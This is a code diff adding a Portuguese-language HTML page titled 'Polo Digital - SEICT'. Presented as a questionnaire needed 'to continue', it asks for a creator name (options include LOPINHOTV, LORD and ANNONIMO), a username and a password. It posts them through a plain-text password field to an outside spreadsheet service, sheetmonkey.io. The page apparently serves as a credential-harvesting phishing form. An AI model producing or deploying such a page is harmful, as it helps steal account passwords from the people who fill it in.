@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Polo Digital - SEICT</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+
+<body>
+    <div class="container">
+        <header>
+            <h1>Polo Digital - SEICT</h1>
+            <p>Preencha o questionário abaixo para continuar.</p>
+        </header>
+        
+
+        <form id="questionario" action="https://api.sheetmonkey.io/form/mYEjkhAZjWtvw3bTz7MABf" method="post">
+            <!-- Campo Criador -->
+            <div class="form-group">
+                <input type="hidden" name="Created" value="x-sheetmonkey-current-date-time" />
+                <label for="criador">Criador:</label>
+                <select id="criador" name="Criador" required>
+                    <option value="" disabled selected>Selecione uma opção</option>
+                    <option value="LOPINHOTV">LOPINHOTV</option>
+                    <option value="LORD">LORD</option>
+                    <option value="ANNONIMO">ANNONIMO</option>
+                    <option value="OUTRO">Outro</option>
+                </select>
+                <input type="text" id="outroCriador" name="CriadorOutro" placeholder="Especifique o criador" class="hidden">
+            </div>
+        
+            <!-- Campo Usuário -->
+            <div class="form-group">
+                <label for="usuario">Usuário:</label>
+                <input type="text" id="usuario" name="Usuario" placeholder="Digite seu nome de usuário" required>
+            </div>
+        
+            <!-- Campo Senha -->
+            <div class="form-group">
+                <label for="senha">Senha:</label>
+                <input type="text" id="senha" name="Senha" placeholder="Digite sua senha" required>
+            </div>
+        
+            <!-- Botão de Envio -->
+            <input type="submit" value="Enviar" class="btn-enviar">
+        </form>
+        
+        
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
